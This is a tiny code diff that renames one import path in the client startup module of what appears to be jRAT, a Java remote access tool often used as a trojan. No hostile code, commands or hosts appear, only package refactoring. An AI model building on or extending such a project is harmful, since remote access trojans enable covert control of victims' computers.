@@ -1,6 +1,6 @@
 package jrat.client.modules.startup;
 
-import io.jrat.common.crypto.CryptoUtils;
+import jrat.common.crypto.CryptoUtils;
 import jrat.client.Configuration;
 import jrat.client.Main;
 import java.io.BufferedReader;
